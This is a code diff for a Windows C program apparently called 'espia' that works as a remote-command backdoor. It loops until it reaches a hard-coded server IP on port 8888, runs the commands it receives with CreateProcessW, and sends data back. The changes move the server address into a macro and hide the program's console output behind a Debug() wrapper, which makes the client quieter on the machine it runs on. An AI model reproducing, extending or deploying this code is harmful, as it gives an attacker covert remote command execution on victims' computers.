@@ -10,6 +10,7 @@
 #endif
 
 #define TRY_SERVER 5
+#define SERVER_IP "172.23.208.199"
 #define BUFF_SIZE 1024
 
 int main() {
@@ -26,7 +27,7 @@ int main() {
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect(SERVER_IP, "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -45,7 +46,7 @@ int main() {
         /* If connection error occured keep trying to connect to the server */
         if (cmd_size == RECV_FAIL) {
             WORD server_status;
-            while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
+            while ((server_status = espia_connect(SERVER_IP, "8888")) == CONNECTION_FAIL)
                 Sleep(TRY_SERVER);
         }
         /* ------------------------------------ */
@@ -104,9 +105,9 @@ int main() {
             PROCESS_INFORMATION procinfo;
             ZeroMemory( &procinfo, sizeof(procinfo));
             if (!CreateProcessW(NULL, cmd_arg, NULL, NULL, FALSE, 0, NULL, NULL, &info, &procinfo)) {
-                printf("Error: %d\n", GetLastError());
+                Debug(printf("Error: %d\n", GetLastError());)
             }
-            printf("Waiting..");
+            Debug(printf("Waiting..");)
             WaitForSingleObject( procinfo.hProcess, INFINITE );
         } else {
             espia_send(recv_buffw, cmd_size);
